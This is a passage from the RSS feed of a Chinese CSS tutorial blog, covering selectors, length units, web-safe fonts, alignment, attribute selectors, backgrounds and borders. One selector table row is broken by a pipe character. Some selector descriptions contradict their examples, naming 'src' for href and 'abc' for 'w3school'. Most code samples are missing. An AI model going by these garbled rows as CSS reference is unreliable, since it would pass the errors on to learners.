<tr>
<th style="text-align:center">选择器</th>
<th style="text-align:left">例子</th>
<th style="text-align:left">例子描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">.class</td>
<td style="text-align:left">.intro</td>
<td style="text-align:left">选择 class="intro" 的所有元素</td>
</tr>
<tr>
<td style="text-align:center">.class1.class2</td>
<td style="text-align:left">.name1.name2</td>
<td style="text-align:left">选择 class 属性中同时有 name1 和 name2 的所有元素</td>
</tr>
<tr>
<td style="text-align:center">.class1 .class2</td>
<td style="text-align:left">.name1 .name2</td>
<td style="text-align:left">选择作为类名 name1 元素后代的所有类名 name2 元素</td>
</tr>
<tr>
<td style="text-align:center">#id</td>
<td style="text-align:left">#firstname</td>
<td style="text-align:left">选择 id="firstname" 的元素</td>
</tr>
<tr>
<td style="text-align:center">*</td>
<td style="text-align:left">*</td>
<td style="text-align:left">选择所有元素</td>
</tr>
<tr>
<td style="text-align:center">element</td>
<td style="text-align:left">p</td>
<td style="text-align:left">选择所有 <code>&lt;p&gt;</code> 元素</td>
</tr>
<tr>
<td style="text-align:center">element.class</td>
<td style="text-align:left">p.intro</td>
<td style="text-align:left">选择 class="intro" 的所有 <code>&lt;p&gt;</code> 元素</td>
</tr>
<tr>
<td style="text-align:center">element,element</td>
<td style="text-align:left">div, p</td>
<td style="text-align:left">选择所有 <code>&lt;div&gt;</code> 元素和所有 <code>&lt;p&gt;</code> 元素</td>
</tr>
<tr>
<td style="text-align:center">element element</td>
<td style="text-align:left">div p</td>
<td style="text-align:left">选择 <code>&lt;div&gt;</code> 元素内的所有 <code>&lt;p&gt;</code> 元素</td>
</tr>
<tr>
<td style="text-align:center">element&gt;element</td>
<td style="text-align:left">div &gt; p</td>
<td style="text-align:left">选择父元素是 <code>&lt;div&gt;</code> 的所有 <code>&lt;p&gt;</code> 元素</td>
</tr>
<tr>
<td style="text-align:center">element+element</td>
<td style="text-align:left">div + p</td>
<td style="text-align:left">选择紧跟 <code>&lt;div&gt;</code> 元素的首个 <code>&lt;p&gt;</code> 元素</td>
</tr>
<tr>
<td style="text-align:center">element1~element2</td>
<td style="text-align:left">p ~ ul</td>
<td style="text-align:left">选择前面有 <code>&lt;p&gt;</code> 元素的每个 <code>&lt;ul&gt;</code> 元素</td>
</tr>
<tr>
<td style="text-align:center">[attribute]</td>
<td style="text-align:left">[target]</td>
<td style="text-align:left">选择带有 target 属性的所有元素</td>
</tr>
<tr>
<td style="text-align:center">[attribute=value]</td>
<td style="text-align:left">[target=_blank]</td>
<td style="text-align:left">选择带有 target="_blank" 属性的所有元素</td>
</tr>
<tr>
<td style="text-align:center">[attribute~=value]</td>
<td style="text-align:left">[title~=flower]</td>
<td style="text-align:left">选择 title 属性包含单词 "flower" 的所有元素</td>
</tr>
<tr>
<td style="text-align:center">[attribute</td>
<td style="text-align:left">=value]</td>
<td style="text-align:left">[lang</td>
</tr>
<tr>
<td style="text-align:center">[attribute^=value]</td>
<td style="text-align:left">a[href^="https"]</td>
<td style="text-align:left">选择其 src 属性值以 "https" 开头的每个 <code>&lt;a&gt;</code> 元素</td>
</tr>
<tr>
<td style="text-align:center">[attribute$=value]</td>
<td style="text-align:left">a[href$=".pdf"]</td>
<td style="text-align:left">选择其 src 属性以 ".pdf" 结尾的所有 <code>&lt;a&gt;</code> 元素</td>
</tr>
<tr>
<td style="text-align:center">[attribute*=value]</td>
<td style="text-align:left">a[href*="w3school"]</td>
<td style="text-align:left">选择其 href 属性值中包含 "abc" 子串的每个 <code>&lt;a&gt;</code> 元素</td>
</tr>
</tbody>
</table>
]]></content:encoded>
    </item>
    <item>
      <title>单位</title>
      <link>https://sankgao.github.io/languages/css3/references/units.html</link>
      <guid>https://sankgao.github.io/languages/css3/references/units.html</guid>
      <source url="https://sankgao.github.io/rss.xml">单位</source>
      <description>CSS 有几种表示长度的不同单位。 许多 CSS 属性接受 “长度” 值。例如：width、`margin、padding、font-size 等。 长度是一个后面跟着长度单位的数字。例如：10px、2em 等。 数字和单位之间不能出现空格。但是，如果值为 0`，则可以省略单位; 对于某些 CSS 属性，允许使用负的长度; 长度单位有两种类型 绝对单位...</description>
      <category>Frontend</category>
      <pubDate>Thu, 18 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>CSS 有几种表示长度的不同单位。</p>
<p>许多 CSS 属性接受 “长度” 值。例如：<code>width</code>、<code>margin</code>、<code>padding</code>、<code>font-size</code> 等。</p>
<p>长度是一个后面跟着长度单位的数字。例如：<code>10px</code>、<code>2em</code> 等。</p>
<ul>
<li>数字和单位之间不能出现空格。但是，如果值为 <code>0</code>，则可以省略单位</li>
<li>对于某些 CSS 属性，允许使用负的长度</li>
<li>长度单位有两种类型 <strong>绝对单位</strong> 和 <strong>相对单位</strong></li>
</ul>
<h2> 绝对长度</h2>
<p>绝对长度单位是固定的，用任何一个绝对长度表示的长度都将恰好显示为这个尺寸。</p>
<p>不建议在屏幕上使用绝对长度单位，因为屏幕尺寸变化很大。但是，如果已知输出介质，则可以使用它们。例如：用于打印布局（print layout）。</p>
<table>
<thead>
<tr>
<th style="text-align:center">单位</th>
<th style="text-align:left">描述</th>
<th style="text-align:center">TIY</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">cm</td>
<td style="text-align:left">厘米</td>
<td style="text-align:center">试一试</td>
</tr>
<tr>
<td style="text-align:center">mm</td>
<td style="text-align:left">毫米</td>
<td style="text-align:center">试一试</td>
</tr>
<tr>
<td style="text-align:center">in</td>
<td style="text-align:left">英寸（1in = 96px = 2.54cm）</td>
<td style="text-align:center">试一试</td>
</tr>
<tr>
<td style="text-align:center">px *</td>
<td style="text-align:left">像素（1px = 1/96th of 1in）</td>
<td style="text-align:center">试一试</td>
</tr>
<tr>
<td style="text-align:center">pt</td>
<td style="text-align:left">点（1pt = 1/72 of 1in）</td>
<td style="text-align:center">试一试</td>
</tr>
<tr>
<td style="text-align:center">pc</td>
<td style="text-align:left">派卡（1pc = 12 pt）</td>
<td style="text-align:center">试一试</td>
</tr>
</tbody>
</table>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p><code>*</code> 像素（px）是相对于观看设备的。对于低 dpi 的设备，1px 是显示器的一个设备像素（点）。对于打印机和高分辨率屏幕，1px 表示多个设备像素</p>
</div>
<h2> 相对长度</h2>
<p>相对长度单位规定相对于另一个长度属性的长度。相对长度单位在不同渲染介质之间缩放表现得更好。</p>
<table>
<thead>
<tr>
<th style="text-align:center">单位</th>
<th style="text-align:left">描述</th>
<th style="text-align:center">TIY</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">em</td>
<td style="text-align:left">相对于元素的字体大小（font-size）（2em 表示当前字体大小的 2 倍）</td>
<td style="text-align:center">试一试</td>
</tr>
<tr>
<td style="text-align:center">ex</td>
<td style="text-align:left">相对于当前字体的 x-height（极少使用）</td>
<td style="text-align:center">试一试</td>
</tr>
<tr>
<td style="text-align:center">ch</td>
<td style="text-align:left">相对于 "0"（零）的宽度</td>
<td style="text-align:center">试一试</td>
</tr>
<tr>
<td style="text-align:center">rem</td>
<td style="text-align:left">相对于根元素的字体大小（font-size）</td>
<td style="text-align:center">试一试</td>
</tr>
<tr>
<td style="text-align:center">vw</td>
<td style="text-align:left">相对于视口 * 宽度的 1%</td>
<td style="text-align:center">试一试</td>
</tr>
<tr>
<td style="text-align:center">vh</td>
<td style="text-align:left">相对于视口 * 高度的 1%</td>
<td style="text-align:center">试一试</td>
</tr>
<tr>
<td style="text-align:center">vmin</td>
<td style="text-align:left">相对于视口 * 较小尺寸的 1%</td>
<td style="text-align:center">试一试</td>
</tr>
<tr>
<td style="text-align:center">vmax</td>
<td style="text-align:left">相对于视口 * 较大尺寸的 1%</td>
<td style="text-align:center">试一试</td>
</tr>
<tr>
<td style="text-align:center">%</td>
<td style="text-align:left">相对于父元素</td>
<td style="text-align:center">试一试</td>
</tr>
</tbody>
</table>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p><code>em</code> 和 <code>rem</code> 单元可用于创建完美的可扩展布局</p>
<p><code>*</code> 视口（Viewport）= 浏览器窗口的尺寸。如果视口宽 <code>50cm</code>，则 <code>1vw = 0.5cm</code></p>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>网络安全字体</title>
      <link>https://sankgao.github.io/languages/css3/references/websafe_fonts.html</link>
      <guid>https://sankgao.github.io/languages/css3/references/websafe_fonts.html</guid>
      <source url="https://sankgao.github.io/rss.xml">网络安全字体</source>
      <description>Web 安全字体 下面列出了适用于 HTML 和 CSS 的最佳 Web 安全字体： Arial（sans-serif）; Verdana（sans-serif）; Helvetica（sans-serif）; Tahoma（sans-serif）; Trebuchet MS（sans-serif）; Times New Roman（serif）; G...</description>
      <category>Frontend</category>
      <pubDate>Thu, 18 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> Web 安全字体</h2>
<p>下面列出了适用于 HTML 和 CSS 的最佳 Web 安全字体：</p>
<ul>
<li><strong>Arial（sans-serif）</strong></li>
<li><strong>Verdana（sans-serif）</strong></li>
<li><strong>Helvetica（sans-serif）</strong></li>
<li><strong>Tahoma（sans-serif）</strong></li>
<li><strong>Trebuchet MS（sans-serif）</strong></li>
<li><strong>Times New Roman（serif）</strong></li>
<li><strong>Georgia（serif）</strong></li>
<li><strong>Garamond（serif）</strong></li>
<li><strong>Courier New（monospace）</strong></li>
<li><strong>Brush Script MT（cursive）</strong></li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>发布网站之前，请您始终检查字体在不同浏览器和设备上的显示效果，并始终使用后备字体</p>
</div>
<h3> Arial（sans-serif）</h3>
<p><code>Arial</code> 是在线和印刷媒体上使用最广泛的字体。<code>Arial</code> 也是 Google Docs 中的默认字体。</p>
<p><code>Arial</code> 是最安全的网络字体之一，并且在所有主要操作系统上都可用。例如：</p>

<h3> Verdana（sans-serif）</h3>
<p><code>Verdana</code> 是一种非常流行的字体。甚至 <code>Verdana</code> 的小字体也很容易阅读。例如：</p>

<h3> Helvetica（sans-serif）</h3>
<p><code>Helvetica</code> 字体广受设计师喜爱。它适合多种商业类型。例如：</p>

<h3> Tahoma（sans-serif）</h3>
<p><code>Tahoma</code> 字体的字符间距较小。例如：</p>

<h3> Trebuchet MS（sans-serif）</h3>
<p><code>Trebuchet MS</code> 由 Microsoft 于 1996 年设计。请谨慎使用此字体。并非所有移动操作系统都支持。例如：</p>

<h3> Times New Roman（serif）</h3>
<p><code>Times New Roman</code> 是世界上最知名的字体之一。它看起来很专业，并在许多报纸和新闻网站中使用。它也是 Windows 设备和应用程序的主要字体。例如：</p>

<h3> Georgia（serif）</h3>
<p><code>Georgia</code> 是一种优雅的衬线字体。它在不同的字体大小下都有很强的可读性，因此非常适合用于移动响应式设计。例如：</p>

<h3> Garamond（serif）</h3>
<p><code>Garamond</code> 是用于许多印刷书籍的经典字体。它拥有经典的外观和良好的可读性。例如：</p>

<h3> Courier New（monospace）</h3>
<p><code>Courier New</code> 是使用最广泛的等宽衬线字体。Courier New 通常用于代码的显示，许多电子邮件提供商将其用作默认字体。Courier New 还是电影剧本的标准字体。例如：</p>

<h3> Brush Script MT（cursive）</h3>
<p><code>Brush Script MT</code> 字体旨在模仿笔迹。它优雅精致，但可能很难阅读。请小心使用。例如：</p>

<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>可以查看 <a href="https://developers.google.com/fonts/" target="_blank" rel="noopener noreferrer">Google 字体</a> 及使用方法</p>
</div>
<h2> 常用的后备字体</h2>
<p>以下是按 5 个通用字体系列组织的一些常用字体后备：</p>
<ul>
<li><strong>衬线字体（Serif）</strong>：在每个字母的边缘都有一个小的笔触。它们营造出一种形式感和优雅感</li>
<li><strong>无衬线字体（Sans-serif）</strong>：字体线条简洁（没有小笔画）。它们营造出现代而简约的外观</li>
<li><strong>等宽字体（Monospace）</strong>：这里所有字母都有相同的固定宽度。它们创造出机械式的外观</li>
<li><strong>草书字体（Cursive）</strong>：模仿了人类的笔迹</li>
<li><strong>幻想字体（Fantasy）</strong>：是装饰性俏皮的字体</li>
</ul>
<h3> Serif 字体</h3>
<ul>
<li>
<p><code>Times New Roman</code> 字体名称。例如：</p>

</li>
<li>
<p><code>Georgia</code> 字体名称。例如：</p>

</li>
<li>
<p><code>Garamond</code> 字体名称。例如：</p>

</li>
</ul>
<h3> Sans-Serif 字体</h3>
<ul>
<li>
<p><code>Arial</code> 和 <code>Helvetica</code> 字体名称。例如：</p>

</li>
<li>
<p><code>Tahoma</code> 和 <code>Verdana</code> 字体名称。例如：</p>

</li>
<li>
<p><code>Trebuchet MS</code> 字体名称。例如：</p>

</li>
<li>
<p><code>Georgia</code> 字体名称。例如：</p>

</li>
</ul>
<h3> Monospace 字体</h3>
<ul>
<li>
<p><code>Courier New</code> 和 <code>Courier</code> 字体名称。例如：</p>

</li>
<li>
<p><code>Lucida Console</code> 字体名称。例如：</p>

</li>
<li>
<p><code>Monaco</code> 字体名称。例如：</p>

</li>
</ul>
<h3> Cursive 字体</h3>
<ul>
<li>
<p><code>Brush Script MT</code> 字体名称。例如：</p>

</li>
<li>
<p><code>Lucida Handwriting</code> 字体名称。例如：</p>

</li>
</ul>
<h3> Fantasy 字体</h3>
<ul>
<li>
<p><code>Copperplate</code> 字体名称。例如：</p>

</li>
<li>
<p><code>Papyrus</code> 字体名称。例如：</p>

</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>基础教程</title>
      <link>https://sankgao.github.io/languages/css3/tutorial/</link>
      <guid>https://sankgao.github.io/languages/css3/tutorial/</guid>
      <source url="https://sankgao.github.io/rss.xml">基础教程</source>
      <description>记录一些 CSS3 基础教程相关的信息。</description>
      <category>Languages</category>
      <pubDate>Tue, 08 Aug 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>记录一些 CSS3 基础教程相关的信息。</p>
<!-- more -->
<h2> 基础教程</h2>
<ul>
<li><a href="/languages/css3/tutorial/introduction.html" target="blank">简介</a></li>
<li><a href="/languages/css3/tutorial/syntax.html" target="blank">语法</a></li>
<li><a href="/languages/css3/tutorial/selectors.html" target="blank">选择器</a></li>
<li><a href="/languages/css3/tutorial/methods.html" target="blank">添加 CSS 方法</a></li>
<li><a href="/languages/css3/tutorial/comments.html" target="blank">注释</a></li>
<li><a href="/languages/css3/tutorial/colors.html" target="blank">颜色</a></li>
<li><a href="/languages/css3/tutorial/background.html" target="blank">背景</a></li>
<li><a href="/languages/css3/tutorial/border.html" target="blank">边框</a></li>
<li><a href="/languages/css3/tutorial/margin.html" target="blank">外边距</a></li>
<li><a href="/languages/css3/tutorial/padding.html" target="blank">内边距</a></li>
<li><a href="/languages/css3/tutorial/dimension.html" target="blank">高度和宽度</a></li>
<li><a href="/languages/css3/tutorial/boxmodel.html" target="blank">框模型</a></li>
<li><a href="/languages/css3/tutorial/outline.html" target="blank">轮廓</a></li>
<li><a href="/languages/css3/tutorial/text.html" target="blank">文本</a></li>
<li><a href="/languages/css3/tutorial/font.html" target="blank">字体</a></li>
<li><a href="/languages/css3/tutorial/icons.html" target="blank">图标</a></li>
<li><a href="/languages/css3/tutorial/link.html" target="blank">链接</a></li>
<li><a href="/languages/css3/tutorial/list.html" target="blank">列表</a></li>
<li><a href="/languages/css3/tutorial/table.html" target="blank">表格</a></li>
<li><a href="/languages/css3/tutorial/display_visibility.html" target="blank">Display</a></li>
<li><a href="/languages/css3/tutorial/max_width.html" target="blank">max_width</a></li>
<li><a href="/languages/css3/tutorial/positioning.html" target="blank">定位</a></li>
<li><a href="/languages/css3/tutorial/overflow.html" target="blank">溢出</a></li>
<li><a href="/languages/css3/tutorial/float.html" target="blank">浮动和清除</a></li>
<li><a href="/languages/css3/tutorial/inline_block.html" target="blank">inline_block</a></li>
<li><a href="/languages/css3/tutorial/align.html" target="blank">对齐</a></li>
<li><a href="/languages/css3/tutorial/combinators.html" target="blank">组合器</a></li>
<li><a href="/languages/css3/tutorial/pseudo_classes.html" target="blank">伪类</a></li>
<li><a href="/languages/css3/tutorial/pseudo_elements.html" target="blank">伪元素</a></li>
<li><a href="/languages/css3/tutorial/transparency.html" target="blank">透明度</a></li>
<li><a href="/languages/css3/tutorial/navbar.html" target="blank">导航栏</a></li>
<li><a href="/languages/css3/tutorial/dropdowns.html" target="blank">下拉菜单</a></li>
<li><a href="/languages/css3/tutorial/images.html" target="blank">图片库</a></li>
<li><a href="/languages/css3/tutorial/attribute_selectors.html" target="blank">属性选择器</a></li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>对齐</title>
      <link>https://sankgao.github.io/languages/css3/tutorial/align.html</link>
      <guid>https://sankgao.github.io/languages/css3/tutorial/align.html</guid>
      <source url="https://sankgao.github.io/rss.xml">对齐</source>
      <description>居中对齐元素 要使块元素（例如： ）水平居中，请使用 margin: auto;。 设置元素的宽度将防止其延伸到容器的边缘。 然后，元素将占用指定的宽度，剩余空间将在两个外边距之间平均分配。例如： 演示 如果未设置 width 属性（或将其设置为 100%），则居中对齐无效 居中对齐文本 如果仅需在元素内居中文本，请使用 text-align: cen...</description>
      <category>Frontend</category>
      <pubDate>Thu, 18 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> 居中对齐元素</h2>
<p>要使块元素（例如：<code>&lt;div&gt;</code> ）水平居中，请使用 <code>margin: auto;</code>。</p>
<p>设置元素的宽度将防止其延伸到容器的边缘。</p>
<p>然后，元素将占用指定的宽度，剩余空间将在两个外边距之间平均分配。例如：</p>

<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>如果未设置 <code>width</code> 属性（或将其设置为 <code>100%</code>），则居中对齐无效</p>
</div>
<h2> 居中对齐文本</h2>
<p>如果仅需在元素内居中文本，请使用 <code>text-align: center;</code>。例如：</p>

<h2> 居中对齐图像</h2>
<p>将左右外边距设置为 <code>auto</code>，并将其设置为块元素。例如：</p>

<h2> 左和右对齐</h2>
<p>对齐元素的一种方法是使用 <code>position: absolute;</code>。例如：</p>

<ul>
<li><strong>position</strong>：属性定义建立元素布局所用的定位机制。<code>absolute</code> 值生成绝对定位的元素</li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>绝对定位的元素将从正常流中删除，并可能出现元素重叠</p>
</div>
<p>对齐元素的另一种方法是使用 <code>float</code> 属性。例如：</p>

<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>如果一个元素比包含它的元素高，并且它是浮动的，它将溢出其容器。您可以使用 <code>clearfix hack</code> 来解决此问题。例如：</p>

</div>
<h2> 垂直对齐</h2>
<p>有很多方法可以在 CSS 中垂直对齐元素。一个简单的解决方案是使用 <code>padding</code> 属性设置上下内边距。例如：</p>

<p>如需同时垂直和水平对齐，请使用 <code>padding</code> 和 <code>text-align: center;</code>。例如：</p>

<p>另一个技巧是使用其值等于 <code>height</code> 属性值的 <code>line-height</code> 属性。例如：</p>

<p>如果您的选择不是 <code>padding</code> 和 <code>line-height</code>，则另一种解决方案是使用 <code>position</code> 和 <code>transform</code> 属性。例如：</p>

<p>您还可以使用 <code>flexbox</code> 将内容居中。请注意，IE10 以及更早的版本不支持 <code>flexbox</code>。例如：</p>

]]></content:encoded>
    </item>
    <item>
      <title>属性选择器</title>
      <link>https://sankgao.github.io/languages/css3/tutorial/attribute_selectors.html</link>
      <guid>https://sankgao.github.io/languages/css3/tutorial/attribute_selectors.html</guid>
      <source url="https://sankgao.github.io/rss.xml">属性选择器</source>
      <description>可以设置带有特定属性或属性值的 HTML 元素的样式。 [attribute] 选择器 [attribute] 选择器用于选取带有指定属性的元素。 例如：选择所有带有 target 属性的 元素。 演示 [attribute=&amp;quot;value&amp;quot;] 选择器 [attribute=&amp;quot;value&amp;quot;] 选择器用于选取带有指定属性和值的元素。 例如：选取所有带有 t...</description>
      <category>Frontend</category>
      <pubDate>Fri, 19 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>可以设置带有特定属性或属性值的 HTML 元素的样式。</p>
<h2> [attribute] 选择器</h2>
<p>[attribute] 选择器用于选取带有指定属性的元素。</p>
<p>例如：选择所有带有 <code>target</code> 属性的 <code>&lt;a&gt;</code> 元素。</p>

<h2> [attribute="value"] 选择器</h2>
<p>[attribute="value"] 选择器用于选取带有指定属性和值的元素。</p>
<p>例如：选取所有带有 <code>target="_blank"</code> 属性的 <code>&lt;a&gt;</code> 元素。</p>

<h2> [attribute~="value"] 选择器</h2>
<p>[attribute~="value"] 选择器选取属性值包含指定词的元素，且指定词前后不可以有任何字符。</p>
<p>例如：选取 <code>title</code> 属性包含 <code>flower</code> 单词的所有元素。</p>

<div class="hint-container note">
<p class="hint-container-title">注</p>
<p>上面的例子会匹配的属性元素：<code>title="flower"</code>、<code>title="summer flower"</code> 以及 <code>title="flower new"</code></p>
<p>但不匹配：<code>title="my-flower"</code>、<code>title="summer_flower"</code> 或 <code>title="flowers"</code></p>
</div>
<h2> [attribute|="value"] 选择器</h2>
<p>[attribute|="value"] 选择器用于选取指定属性以指定值开头的元素，且指定值后面只能有短横杠（<code>-</code>）字符连接其他值。</p>
<p>例如：选取 class 属性以 <code>top</code> 开头的所有元素。</p>

<div class="hint-container note">
<p class="hint-container-title">注</p>
<p>上面的例子会匹配的属性元素：<code>class="top"</code> 以及 <code>class="top-text"</code></p>
<p>但不匹配：<code>class="top header"</code>、<code>class="texttop"</code>、<code>class="text_top"</code> 或 <code>class="topcontent"</code></p>
</div>
<h2> [attribute^="value"] 选择器</h2>
<p>[attribute^="value"] 选择器用于选取指定属性以指定值开头的元素，指定值后面可以是任何字符。</p>
<p>例如：选取 class 属性以 <code>top</code> 开头的所有元素。</p>

<div class="hint-container note">
<p class="hint-container-title">注</p>
<p>值不必是完整单词</p>
</div>
<h2> [attribute$="value"] 选择器</h2>
<p>[attribute$="value"] 选择器用于选取指定属性以指定值结尾的元素，且指定值前面不可以有横杠（<code>-</code>）字符连接其他值。</p>
<p>例如：选取 class 属性以 <code>test</code> 结尾的所有元素。</p>

<div class="hint-container note">
<p class="hint-container-title">注</p>
<p>值不必是完整单词</p>
<p>上面的例子会匹配的属性元素：<code>class="top header test"</code>、<code>class="top_test"</code> 以及 <code>class="topcontenttest"</code></p>
<p>但不匹配：<code>class="top-text"</code></p>
</div>
<h2> [attribute*="value"] 选择器</h2>
<p>[attribute*="value"] 选择器选取属性值包含指定词的元素，指定值前后可以是任何字符。</p>
<p>例如：选取 class 属性包含 <code>te</code> 的所有元素。</p>

<h2> 设置表单样式</h2>
<p>若需为不带 <code>class</code> 或 <code>id</code> 的表单设置样式，属性选择器会很有用。例如：</p>

]]></content:encoded>
    </item>
    <item>
      <title>背景</title>
      <link>https://sankgao.github.io/languages/css3/tutorial/background.html</link>
      <guid>https://sankgao.github.io/languages/css3/tutorial/background.html</guid>
      <source url="https://sankgao.github.io/rss.xml">背景</source>
      <description>CSS 背景属性用于定义元素的背景效果。 CSS 指定元素的背景色 background-color 属性指定元素的背景色。 例如： 演示 通过 CSS，颜色通常由以下方式指定： 颜色名称。例如：red; 十六进制值。例如：#ff0000; RGB 值。例如：rgb(255,0,0); 其他元素 您可以为任何 HTML 元素设置背景颜色。 例如：以下 ...</description>
      <category>Frontend</category>
      <pubDate>Mon, 15 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>CSS 背景属性用于定义元素的背景效果。</p>
<h2> CSS 指定元素的背景色</h2>
<p><code>background-color</code> 属性指定元素的背景色。</p>
<p>例如：</p>

<p>通过 CSS，颜色通常由以下方式指定：</p>
<ul>
<li><strong>颜色名称</strong>。例如：<code>red</code></li>
<li><strong>十六进制值</strong>。例如：<code>#ff0000</code></li>
<li><strong>RGB 值</strong>。例如：<code>rgb(255,0,0)</code></li>
</ul>
<h3> 其他元素</h3>
<p>您可以为任何 HTML 元素设置背景颜色。</p>
<p>例如：以下 <code>&lt;h1&gt;</code>、<code>&lt;p&gt;</code> 和 <code>&lt;div&gt;</code> 元素将拥有不同的背景色。</p>

<h3> 不透明度/透明度</h3>
<p><code>opacity</code> 属性指定元素的 <strong>不透明度/透明度</strong>。取值范围为 <code>0.0-1.0</code>。值越低，越透明。例如：</p>

<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>使用 <code>opacity</code> 属性为元素的背景添加透明度时，其所有子元素都继承相同的透明度。这可能会使完全透明的元素内的文本难以阅读</p>
</div>
<h3> 使用 RGBA 的透明度</h3>
<p>如果您不希望对子元素应用不透明度，请使用 <code>RGBA</code> 颜色值。例如：</p>

<h2> CSS 背景图像</h2>
<p><code>background-image</code> 属性指定用作元素背景的图像。还可以为特定元素设置背景图像。例如：<code>&lt;p&gt;</code> 元素。</p>
<p>默认情况下，图像会重复，以覆盖整个元素。例如：</p>

<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>使用背景图像时，请使用不会干扰文本的图像</p>
</div>
<p>还可以为特定元素设置背景图像。例如：<code>&lt;p&gt;</code> 元素。</p>

<h2> CSS 背景重复</h2>
<p>默认情况下，<code>background-image</code> 属性在水平和垂直方向上都重复图像。</p>
<p>某些图像应只适合水平或垂直方向上重复，否则它们看起来会很奇怪。例如：</p>

<h3> 水平方向重复</h3>
<p>使用 <code>background-repeat</code> 属性可以让背景看起来会更好。例如：</p>

<ul>
<li><strong>background-repeat</strong>：属性设置是否及如何重复背景图像
<ul>
<li><strong>repeat-x</strong>：图像仅在水平方向重复</li>
<li><strong>repeat-y</strong>：图像仅在垂直方向重复</li>
<li><strong>no-repeat</strong>：背景图像将仅显示一次</li>
</ul>
</li>
</ul>
<h3> CSS 指定背景图像的位置</h3>
<p>使用 <code>background-position</code> 属性可以指定图像的位置。例如：</p>

<ul>
<li>
<p><strong>background-position</strong>：属性用于指定背景图像的位置，值的位置 <strong>可以互换</strong></p>
<ul>
<li><strong>top left</strong>：上左角</li>
<li><strong>top center</strong>：上中角</li>
<li><strong>top right</strong>：上右角</li>
<li><strong>center left</strong>：中左角</li>
<li><strong>center center</strong>：中中角</li>
<li><strong>center right</strong>：中右角</li>
<li><strong>bottom left</strong>：下左角</li>
<li><strong>bottom center</strong>：下中角</li>
<li><strong>bottom right</strong>：下右角</li>
</ul>
</li>
<li>
<p><strong>margin-right</strong>：属性设置元素的右外边距，使文本不会覆盖背景图片</p>
</li>
</ul>
<h2> CSS 背景附着</h2>
<h3> CSS 指定背景图像是否固定</h3>
<p>指定应该固定背景图像。例如：</p>

<ul>
<li><strong>background-attachment</strong>：属性指定背景图像是应该 <strong>滚动</strong> 还是 <strong>固定</strong> 的（不会随页面的其余部分一起滚动）
<ul>
<li><strong>fixed</strong>：当页面的其余部分滚动时，背景图像 <strong>不会移动</strong></li>
<li><strong>scroll</strong>：背景图像会 <strong>随着页面</strong> 其余部分的滚动而 <strong>移动</strong></li>
</ul>
</li>
</ul>
<h2> CSS 背景简写</h2>
<h3> CSS background 简写属性</h3>
<p>如需缩短代码，也可以在一个 <code>background</code> 属性中指定所有背景属性。它被称为 <strong>简写属性。</strong></p>
<p>而不是这样写：</p>
<div class="language-css line-numbers-mode" data-ext="css"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>使用简写属性在一条声明中设置背景属性。例如：</p>

<p>在使用简写属性时，属性值的顺序为：</p>
<ul>
<li><code>background-color</code></li>
<li><code>background-image</code></li>
<li><code>background-repeat</code></li>
<li><code>background-attachment</code></li>
<li><code>background-position</code></li>
</ul>
<p>属性值之一缺失并不要紧，只要按照此顺序设置其他值即可。请注意，在上面的例子中，没有使用 <code>background-attachment</code> 属性，因为它没有值。</p>
]]></content:encoded>
    </item>
    <item>
      <title>边框</title>
      <link>https://sankgao.github.io/languages/css3/tutorial/border.html</link>
      <guid>https://sankgao.github.io/languages/css3/tutorial/border.html</guid>
      <source url="https://sankgao.github.io/rss.xml">边框</source>
      <description>CSS 边框 CSS 边框属性 CSS border 属性允许您指定元素边框的样式、宽度和颜色。 CSS 边框样式 border-style 属性指定要显示的边框类型。 允许以下值： dotted：定义点状边框; dashed：定义虚线边框; solid：定义实线边框; double：定义双线边框; groove：定义 3D 坡口边框（凹槽边框）。效果...</description>
      <category>Frontend</category>
      <pubDate>Mon, 15 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> CSS 边框</h2>
<h3> CSS 边框属性</h3>
<p>CSS <code>border</code> 属性允许您指定元素边框的样式、宽度和颜色。</p>
<h3> CSS 边框样式</h3>
<p><code>border-style</code> 属性指定要显示的边框类型。</p>
<p>允许以下值：</p>
<ul>
<li><strong>dotted</strong>：定义点状边框</li>
<li><strong>dashed</strong>：定义虚线边框</li>
<li><strong>solid</strong>：定义实线边框</li>
<li><strong>double</strong>：定义双线边框</li>
<li><strong>groove</strong>：定义 3D 坡口边框（凹槽边框）。效果取决于 <code>border-color</code> 值</li>
<li><strong>ridge</strong>：定义 3D 脊线边框（垄状边框）。效果取决于 <code>border-color</code> 值</li>
<li><strong>inset</strong>：定义 3D inset 边框。效果取决于 <code>border-color</code> 值</li>
<li><strong>outset</strong>：定义 3D outset 边框。效果取决于 <code>border-color</code> 值</li>
<li><strong>none</strong>：定义无边框</li>
<li><strong>hidden</strong>：定义隐藏边框</li>
</ul>
<p><code>border-style</code> 属性可以设置一到四个值（用于上边框、右边框、下边框和左边框）。例如：</p>

<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>除非设置了 <code>border-style</code> 属性，否则其他 CSS 边框属性都不会有任何作用</p>
</div>
<h2> CSS 边框宽度</h2>
<p><code>border-width</code> 属性指定四个边框的宽度。</p>
